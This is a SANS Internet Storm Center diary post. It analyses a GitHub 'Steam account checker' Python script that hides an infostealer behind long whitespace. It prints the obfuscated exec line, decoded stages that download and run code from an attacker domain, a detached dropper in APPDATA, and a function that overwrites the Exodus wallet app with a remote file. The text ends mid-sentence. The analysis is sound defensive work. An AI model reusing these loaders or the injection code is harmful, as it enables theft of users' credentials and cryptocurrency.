---
title: Steam Account Checker Poisoned with Infostealer, (Thu, Nov 7th)
url: https://isc.sans.edu/diary/rss/31420
source: SANS Internet Storm Center, InfoCON: green
date: 2024-11-08
fetch_date: 2025-10-06T19:21:09.406267
---

# Steam Account Checker Poisoned with Infostealer, (Thu, Nov 7th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31414)
* [next](/diary/31424)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Steam Account Checker Poisoned with Infostealer](/forums/diary/Steam%2BAccount%2BChecker%2BPoisoned%2Bwith%2BInfostealer/31420/)

**Published**: 2024-11-07. **Last Updated**: 2024-11-07 07:49:23 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Steam%2BAccount%2BChecker%2BPoisoned%2Bwith%2BInfostealer/31420/#comments)

I found an interesting script targeting Steam users. Steam[[1](https://store.steampowered.com)] is a popular digital distribution platform for purchasing, downloading, and playing video games on personal computers. The script is called "steam-account-checker" and is available in Github[[2](https://github.com/adexcedaom/steam-account-checker/tree/main)]. Its description is:

*"steam account checker ? check your steam log 2024 ? simple script that validates steam logins fast and easy."*

Updated two months ago, the script seems obfuscated and looks nice when checked online:

![](https://isc.sans.edu/diaryimages/images/isc-20241107-1.png)

But if you download the file and check it carefully:

```

remnux@remnux:/MalwareZoo/20241106$ xxd checker.py|head -10
00000000: 696d 706f 7274 206f 7320 2020 2020 2020  import os
00000010: 2020 2020 2020 2020 2020 2020 2020 2020
00000020: 2020 2020 2020 2020 2020 2020 2020 2020
00000030: 2020 2020 2020 2020 2020 2020 2020 2020
00000040: 2020 2020 2020 2020 2020 2020 2020 2020
00000050: 2020 2020 2020 2020 2020 2020 2020 2020
00000060: 2020 2020 2020 2020 2020 2020 2020 2020
00000070: 2020 2020 2020 2020 2020 2020 2020 2020
00000080: 2020 2020 2020 2020 2020 2020 2020 2020
00000090: 2020 2020 2020 2020 2020 2020 2020 2020
```

The author used a simple trick to hide malicious code: The first line appends space characters (0x20) to hide the following code. Read: It's not displayed in an editor that does not wrap up long lines. Let's remove them and the first line will look like this:

```

import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ005bzhZQWpPWTVnMlBSMlZFeVFMTlZfQjNzZkgtejIwNUhxX1lSNVRJVmM9JykuZGVjcnlwdChiJ2dBQUFBQUJtOFoxY2tsTDA0QllhLWg1dEhkNkdBaUhrT1VTVldpRmw4UlFaUi1GTFlHcVBYbVR3cm5iVmZ2S2F2aWhva1BEZTY0d092S21LQ0U5a3BhcTVYYTlycWxPNlRMU1oxZHNNTVlwdG80X3lJeElTZElLaGRROW9ZREhhNzgwMVYySW9IVkY4aEhXVjZzeEtwZFVaUHphaEJzMHpSM2NKTVZELVN2cmNRdlFKQkMzNGU2bV9BbGptMnJNb190M2Rkb0stZ0hhY09YRVYzWmRicmM1bXU5UWQzS09DcXFqQzEtNUV3WmxEYlJPUEx5cUg3aE09Jykp').decode())
```

Let's decode the payload:

```

remnux@remnux:/MalwareZoo/20241106$ base64dump.py checker.py -n 10 -s 1 -d
os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'M9o8YAjOY5g2PR2VEyQLNV_B3sfH-z205Hq_YR5TIVc=').decrypt(b'gAAAAABm8Z1cklL04BYa-h5tHd6GAiHkOUSVWiFl8RQZR-FLYGqPXmTwrnbVfvKavihokPDe64wOvKmKCE9kpaq5Xa9rqlO6TLSZ1dsMMYpto4_yIxISdIKhdQ9oYDHa7801V2IoHVF8hHWV6sxKpdUZPzahBs0zR3cJMVD-SvrcQvQJBC34e6m_Aljm2rMo_t3ddoK-gHacOXEV3Zdbrc5mu9Qd3KOCqqjC1-5EwZlDbROPLyqH7hM='))
```

The code is encrypted via Fernet, a common symmetric encryption algorithm used in many Python scripts. The decoded and executed payload is:

```

b"exec(requests.get('hxxps://dieserbenni[.]ru/paste?repo=steam-account-checker').text.replace('<pre>','').replace('</pre>',''))"
```

The attacker protected this URL behind CloudFlare and you need to use the right user agent to access the content (the Python UA):

```

import sys
import subprocess
import os
subprocess.run(["cmd.exe", "/c", sys.executable, "-m", "pip", "install", "fernet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
from fernet import Fernet
content = """
from fernet import Fernet
exec(Fernet(b'fopcqWb6WnzpGsWKJI6vm5-Tf9ac8fHEzLesIk7H8qg=').decrypt(b'gAAAAABn ...(Redacted) ... eiBpcnmJDPW2Ll4LgI=').decode())
"""
gruppe_path = os.path.join(os.getenv('APPDATA'), 'gruppe.py')

with open(gruppe_path, 'w') as file:
    file.write(content)

subprocess.Popen([sys.executable, gruppe_path],creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
```

This payload will install the Fernet module (which should already be installed if you reach this step), decode another payload, save it to a file in %APPDATA%, and execute it.

I looked at this payload; it remains a classic info stealer. It injects malicious code in Exodus (I already covered this technique in another diary[[3](https://isc.sans.edu/diary/Python%2BInfostealer%2BPatching%2BWindows%2BExodus%2BApp/31276)]):

```

def inject():
    procc = "exodus.exe"
    local = os.getenv("localappdata")
    path = f"{local}/exodus"
    if not os.path.exists(path): return
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]
    exodusPatchURL = "https://dieserbenni.ru/app.asar"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"}
    req = Request(exodusPatchURL, headers=headers)
    response = urlopen(req)
    data = response.read()
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    for app in apps:
        try:
            fullpath = f"{path}/{app}/resources/app.asar"
            with open(fullpath, 'wb') as out_file1:
                out_file1.write(data)
        except: pass
```

This infostealer is almost identical to the one covered in my previous diary but this...